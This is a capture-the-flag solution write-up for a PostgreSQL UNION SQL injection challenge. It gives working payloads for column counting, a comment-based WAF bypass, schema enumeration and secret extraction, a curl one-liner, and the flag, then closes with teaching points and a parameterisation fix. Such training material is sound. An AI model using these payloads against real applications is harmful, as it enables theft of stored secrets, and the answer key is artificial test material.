# SOLUTION — VANTAGE Procurement Cloud (UNION SQLi / PostgreSQL)

> **Spoiler.** This is the intended path with working payloads. Keep it away from
> players. Flag: `Securinets{un10n_h4rv3st_fr0m_th3_p0stgr3s_v4ult}`

The server builds the catalog query like this (simplified):

```sql
SELECT product_code, name, description, category, vendor, price_usd
FROM products
WHERE 1=1
  AND category = '<category>'      -- user input, concatenated  (VULNERABLE)
  AND name ILIKE %s                -- user input, bound param   (only if q given; SAFE)
  AND is_active = TRUE
ORDER BY name ASC;
```

Six columns are returned, in this order and with these types:

| # | column        | type      |
|---|---------------|-----------|
| 1 | product_code  | text      |
| 2 | name          | text      |
| 3 | description   | text      |
| 4 | category      | text      |
| 5 | vendor        | text      |
| 6 | price_usd     | numeric   |

All six are rendered in the results table, so any of them can carry exfiltrated
data. Five are text, which makes placing stolen strings easy.

---

## Step 0 — Find the injectable parameter

Two inputs exist: `q` and `category`.

- `?q='` → page still works, just no matches. `q` is a **bound parameter** — a
  dead end (the intended red herring).
- `?category='` → the query breaks and the page shows a generic
  *"Catalog service error"* banner. `category` is **injectable**.

```
http://localhost:8080/catalog?category='
```

Note the app never prints the PostgreSQL error, so you won't get free column
hints — behaviour (results vs. error banner) is your only oracle.

> The WAF inspects **both** inputs, so throwing a full `UNION SELECT` at `q`
> also returns `WAF_DENY` and can look injectable at a glance. The clean
> distinguisher is the **bare single quote**: `q='` returns a normal 200 (it's
> bound), while `category='` throws the error banner. Only `category` breaks the
> query itself.

---

## Step 1 — Confirm the injection and count columns

`ORDER BY` probing. A valid ordinal returns results; an out-of-range one trips
the error banner.

```
?category=Servers' ORDER BY 6-- 
?category=Servers' ORDER BY 7-- 
```

`ORDER BY 6` → Servers listed (success). `ORDER BY 7` → error banner. ⇒ **6 columns.**

(`ORDER BY` and the single quote are not filtered, so this stage is clean.)

---

## Step 2 — Meet the WAF, then bypass it

The straightforward UNION is rejected:

```
?category=' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL-- 
→ "Request blocked by security policy. (WAF_DENY)"
```

The filter blocks the token `UNION [ALL] SELECT` when separated by whitespace
(and also `OR 1=1`, `;`, `pg_sleep`, DDL/DML). Break the token with a PostgreSQL
inline comment, which the server-side SQL still accepts as a separator:

```
?category=' UNION/**/SELECT NULL,NULL,NULL,NULL,NULL,NULL-- 
```

This passes the WAF and runs. Because `category=''` matches no real product, the
only row returned is your injected one — confirming control.

---

## Step 3 — Place data in visible columns

Drop markers in to see where each column surfaces:

```
?category=' UNION/**/SELECT 'C1','C2','C3','C4','C5',1-- 
```

You'll see C1 in **Code**, C2 in **Name**, C3 in **Description**, C4 in
**Category**, C5 in **Vendor**, and `1.00` in **Price**. Columns 1–5 take text
directly; column 6 is numeric (use a number or `NULL`).

---

## Step 4 — Enumerate the schema

List the tables in the `public` schema:

```
?category=' UNION/**/SELECT table_name,table_schema,NULL,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema='public'-- 
```

Returned: `products`, `employees`, **`vault_secrets`** ← the catalog never
touches this one.

List its columns:

```
?category=' UNION/**/SELECT column_name,data_type,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='vault_secrets'-- 
```

Returned: `id`, `key_name`, `secret_value`, `rotated_at`.

---

## Step 5 — Exfiltrate the flag

```
?category=' UNION/**/SELECT key_name,secret_value,NULL,NULL,NULL,NULL FROM vault_secrets-- 
```

Three rows come back. `deploy_token` and `smtp_relay_pass` are decoys; the flag
is the `secret_value` where `key_name = 'ctf_flag'`. Filter it directly:

```
?category=' UNION/**/SELECT key_name,secret_value,NULL,NULL,NULL,NULL FROM vault_secrets WHERE key_name='ctf_flag'-- 
```

→ **`Securinets{un10n_h4rv3st_fr0m_th3_p0stgr3s_v4ult}`**

(The `employees` table holds bcrypt hashes — realistic noise, not the objective.)

---

## Copy-paste solve against the JSON API

The `/api/products` endpoint runs the same builder and returns clean JSON:

```bash
BASE=http://localhost:8080

# column count is known (6); go straight to extraction
curl -sG "$BASE/api/products" \
  --data-urlencode "category=' UNION/**/SELECT key_name,secret_value,NULL,NULL,NULL,NULL FROM vault_secrets WHERE key_name='ctf_flag'-- " \
  | python3 -c "import sys,json;print(json.load(sys.stdin)['results'][0]['name'])"
# -> Securinets{un10n_h4rv3st_fr0m_th3_p0stgr3s_v4ult}
```

The exfiltrated `secret_value` lands in the `name` field of the JSON result
(column 2 of the UNION).

---

## Teaching points this challenge forces

1. **Not every input is injectable** — `q` is parameterised; you must test each.
2. **Blind column counting** when errors are suppressed (`ORDER BY` oracle).
3. **WAF evasion** via inline comments as token separators.
4. **PostgreSQL UNION type alignment** — numeric vs. text columns.
5. **`information_schema` enumeration** to reach data the app never selects.
6. **Least privilege as mitigation** — the read-only role is why stacked-query
   and write-based tricks go nowhere, isolating UNION read-out as the real risk.

## The real fix (for a post-event debrief)

Parameterise `category` exactly like `q`:

```python
sql += " AND category = %s"
params.append(category)
```

Parameterisation defeats this regardless of the WAF — the WAF is defense in
depth, not the control. The least-privilege app role and suppressed errors are
the other two layers worth calling out.
